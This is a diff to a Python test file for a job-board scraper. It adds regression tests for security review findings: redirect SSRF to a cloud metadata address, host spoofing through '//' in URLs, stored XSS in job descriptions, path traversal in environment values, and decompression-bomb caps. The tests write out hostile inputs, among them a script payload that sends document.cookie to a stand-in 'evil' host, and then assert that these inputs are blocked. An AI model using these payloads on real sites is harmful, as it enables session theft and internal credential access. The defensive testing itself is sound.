@@ -8,6 +8,11 @@ One test per finding, each reproducing the reviewer's own PoC:
 * V3 S5  — `Retry-After: inf`
 * V3 S6  — Lever pagination that never terminates
 * V3 S12 — a career-site host read out of a query string
+* V3 S19 — a redirect leaving the host allowlist entirely
+* V3 S20 — decompression caps larger than the container they run in
+* V3 S23 — `descriptionHtml` shipping live `<script>` / `on*=` handlers
+* V3 S25 — a `//` in a path or query faking a host position
+* V3 S27 — unvalidated `ATS_REPO_OWNER`, and `..` inside a directory commit
 * V1 B1 / V3 S4 — `includeRawJson` re-exporting what `redactContacts` removed
 """
 
@@ -21,20 +26,23 @@ import pytest
 import respx
 
 from core import directory as directory_mod
+from core import http as http_mod
 from core.directory import MAX_DIRECTORY_BYTES, parse_jsonl
 from core.http import (
     MAX_RESPONSE_BYTES,
     HttpError,
     ParseError,
     check_host,
+    checked_env,
     make_client,
     retry_after_seconds,
 )
 from core.models import Ref
+from core.normalize.html import sanitize_html
 from core.normalize.record import build_job_record
 from core.normalize.redact import strip_contact_fields
-from core.providers import lever
-from core.resolve import parse_prefix, parse_url, resolve, valid_slug
+from core.providers import greenhouse, lever
+from core.resolve import Unresolved, parse_prefix, parse_url, resolve, valid_slug
 
 REF = Ref(provider="greenhouse", slug="acme")
 
@@ -133,7 +141,11 @@ def _bomb(size: int) -> bytes:
 
 def test_directory_gzip_is_capped(monkeypatch):
     """V3 S2: 102 kB in, 100 MB out, 1 GB peak RSS — OOM at every memory tier."""
-    assert MAX_DIRECTORY_BYTES == 64 * 1024 * 1024
+    # V3 S20: the cap is sized against the *container*, not against what a bomb looks
+    # like. `parse_jsonl` turns wire bytes into resident dicts at a measured 6.9x, so a
+    # 64 MB cap admitted a 25 kB file needing ~444 MB against `minMemoryMbytes: 256`.
+    # Asserting the relationship rather than the number is what keeps the two in step.
+    assert MAX_DIRECTORY_BYTES * 7 < 256 * 1024 * 1024
     monkeypatch.setattr(directory_mod, "MAX_DIRECTORY_BYTES", SMALL_LIMIT)
     blob = _bomb(SMALL_LIMIT * 64)
     assert len(blob) < 20_000, "precondition: the bomb is small on the wire"
@@ -147,7 +159,12 @@ def test_directory_gzip_is_capped(monkeypatch):
 @respx.mock
 async def test_response_body_is_capped(client, monkeypatch):
     """V3 S3: httpx inflates `Accept-Encoding: gzip` into `.content` with no limit."""
-    assert MAX_RESPONSE_BYTES == 64 * 1024 * 1024
+    # V3 S20: the cap is per *response* and `maxConcurrency` reaches 32, so the product is
+    # what has to fit inside `actor.json`'s `maxMemoryMbytes: 1024`.
+    assert 32 * MAX_RESPONSE_BYTES <= 768 * 1024 * 1024
+    # And Greenhouse's graceful re-fetch-without-descriptions guard has to trip *below*
+    # the transport's hard cap, or `read_capped` raises first and that path is dead code.
+    assert greenhouse.MAX_BODY_BYTES < MAX_RESPONSE_BYTES
     monkeypatch.setattr("core.http.MAX_RESPONSE_BYTES", SMALL_LIMIT)
     url = "https://boards-api.greenhouse.io/v1/boards/acme/jobs"
     respx.get(url).mock(
@@ -238,3 +255,158 @@ def test_strip_contact_fields_is_depth_bounded():
     for _ in range(40):
         current["next"] = current = {}
     assert strip_contact_fields(deep) is not None  # terminates, does not recurse forever
+
+
+# --- V3 S19: check_host ran on the first URL only --------------------------------------
+
+
+@respx.mock
+async def test_a_redirect_cannot_leave_the_allowlist(client):
+    """V3 S19: `Client.get` validated the URL it was handed, then let httpx follow the
+    chain itself with nothing re-entering `check_host`. `core/directory.py` is that call
+    site and it passes `follow_redirects=True`, so a 302 off an allowlisted host reached
+    plaintext link-local — both the allowlist and the https-only rule bypassed at once."""
+    start = "https://cdn.jsdelivr.net/gh/o/ats-directory@main/companies.jsonl.gz"
+    respx.get(start).mock(
+        return_value=httpx.Response(
+            302, headers={"location": "http://169.254.169.254/latest/meta-data/"}
+        )
+    )
+    leak = respx.get("http://169.254.169.254/latest/meta-data/").mock(
+        return_value=httpx.Response(200, content=b"AKIA-SECRET")
+    )
+    with pytest.raises(HttpError):
+        await client.get(start, follow_redirects=True)
+    assert leak.call_count == 0, "the hop must never be issued at all"
+
+
+@respx.mock
+async def test_an_allowlisted_redirect_still_works(client):
+    """The guard must not break the redirect the adapters legitimately follow."""
+    start = "https://boards-api.greenhouse.io/v1/boards/acme/jobs"
+    respx.get(start).mock(
+        return_value=httpx.Response(
+            301, headers={"location": "https://job-boards.greenhouse.io/acme"}
+        )
+    )
+    respx.get("https://job-boards.greenhouse.io/acme").mock(
+        return_value=httpx.Response(200, content=b"[]")
+    )
+    response = await client.get(start, follow_redirects=True)
+    assert response.content == b"[]"
+
+
+# --- V3 S25: `//` faked a host position anywhere in the entry -------------------------
+
+
+@pytest.mark.parametrize(
+    "entry",
+    [
+        "https://attacker.example/r?u=//jobs.lever.co/palantir",
+        "https://attacker.example/#//bunq.recruitee.com",
+        "http://evil.test/a//jobs.ashbyhq.com/openai",
+        "https://evil.example/?for=stripe&h=//boards.greenhouse.io/embed/job_board",
+    ],
+)
+def test_a_double_slash_in_a_path_or_query_is_not_a_host(entry: str):
+    """V3 S25, the residue of S12: the patterns anchored on `(?:\\A|//)` but `//` was
+    matched *anywhere*, so the entry the user reads and the board they are billed for were
+    different companies. No SSRF — the fetch still went to the real ATS host."""
+    assert parse_url(entry) is None
+    assert isinstance(resolve(entry), Unresolved)
+
+
+@pytest.mark.parametrize(
+    ("entry", "provider", "slug"),
+    [
+        ("jobs.lever.co/palantir", "lever", "palantir"),
+        ("https://jobs.eu.lever.co/wise", "lever", "wise"),
+        ("https://www.bunq.recruitee.com/o/dev", "recruitee", "bunq"),
+        ("https://boards.greenhouse.io/embed/job_board?for=stripe", "greenhouse", "stripe"),
+        ("https://job-boards.greenhouse.io/anthropic/jobs/4019283", "greenhouse", "anthropic"),
+        # §5.11/§6.4 keep a slug verbatim, and Recruitee/Personio carry it in the *host* —
+        # so the canonical target cannot be built from the lowercasing `urlsplit.hostname`.
+        ("https://Acme-Corp.recruitee.com/o/engineer", "recruitee", "Acme-Corp"),
+        ("https://Personio.jobs.personio.de/xml", "personio", "Personio"),
+    ],
+)
+def test_every_live_url_form_still_resolves(entry: str, provider: str, slug: str):
+    ref = parse_url(entry)
+    assert ref is not None and (ref.provider, ref.slug) == (provider, slug)
+
+
+@pytest.mark.parametrize(
+    "entry", ["https://acme.recruitee.com:8080/o/x", "https://u:p@acme.recruitee.com/o/x"]
+)
+def test_a_port_or_userinfo_still_fails_to_match(entry: str):
+    """V3 S1 stays closed: the netloc is used verbatim, so anything carrying an authority
+    trick simply fails the anchored pattern rather than yielding a Ref."""
+    assert parse_url(entry) is None
+
+
+# --- V3 S23: descriptionHtml shipped live executable markup ---------------------------
+
+
+def test_description_html_carries_no_executable_markup():
+    """V3 S23 / S8: the ad body is employer-written, arrives over an unauthenticated public
+    endpoint, and buyers render it. `html.py` dropped `<script>` for the *text* rendering
+    only; `descriptionHtml` was passed through byte-for-byte, and Greenhouse's is
+    `html.unescape`d first, which turns an escaped payload into live markup in ours."""
+    record = build_job_record(
+        REF,
+        {
+            "sourceId": "1",
+            "title": "T",
+            "descriptionHtml": (
+                '<p>hi</p><script>fetch("//evil/?c="+document.cookie)</script>'
+                '<img src=x onerror=alert(1)><a href="javascript:x()">a</a>'
+                '<IFRAME SRC="//evil"></IFRAME><div ONCLICK="a()">t</div>'
+            ),
+        },
+        {"includeDescription": True, "descriptionFormat": "html"},
+    )
+    html = record.descriptionHtml
+    for payload in ("<script", "onerror", "onclick", "javascript:", "<iframe"):
+        assert payload not in html.lower(), payload
+    assert "<p>hi</p>" in html and "<div>t</div>" in html, "formatting must survive"
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        '<p>Keep <strong>this</strong> and <a href="https://acme.com/apply">apply</a></p>',
+        "<p>3 &lt; 5 and on-site work</p>",
+        '<span data-on="x">ok</span>',
+    ],
+)
+def test_a_benign_ad_body_is_untouched(body: str):
+    """The sanitiser must not corrupt the product: `data-on=` is not an event handler."""
+    assert sanitize_html(body) == body
+
+
+# --- V3 S20 / S27: caps and env validation --------------------------------------------
+
+
+def test_the_directory_row_count_is_capped(monkeypatch):
+    """V3 S20: bytes alone were not enough — a pathological line count reaches the same
+    OOM by another door, and `_rows` degrades a ValueError to "this source missed"."""
+    monkeypatch.setattr(directory_mod, "MAX_DIRECTORY_ROWS", 10)
+    blob = b"\n".join(b'{"provider": "lever", "slug": "acme%d"}' % i for i in range(50))
+    with pytest.raises(ValueError):
+        parse_jsonl(blob)
+    assert directory_mod._rows(blob) == []
+
+
+@pytest.mark.parametrize("bad", ["../../evil", "own er", "a" * 40, "", "o/../x"])
+def test_a_malformed_repo_owner_never_reaches_a_url_or_the_user_agent(bad: str):
+    """V3 S27: `ATS_REPO_OWNER` was formatted straight into the User-Agent unvalidated,
+    while its two sibling env knobs were checked — and the UA is the entire legal
+    posture's identifier (§5, §14 R21). One validator now, not two."""
+    assert checked_env(bad, http_mod._OWNER_RE, "ats-jobs") == "ats-jobs"
+
+
+@pytest.mark.parametrize("bad", ["..", "a/../b", "....", "x" * 41])
+def test_a_directory_commit_cannot_traverse(bad: str):
+    """V3 S27: `_COMMIT_RE` admitted `..`, so `@../companies.jsonl.gz` was path confusion
+    inside jsDelivr. `check_host` still pinned the host, which is why this is a LOW."""
+    assert checked_env(bad, directory_mod._COMMIT_RE, "main") == "main"
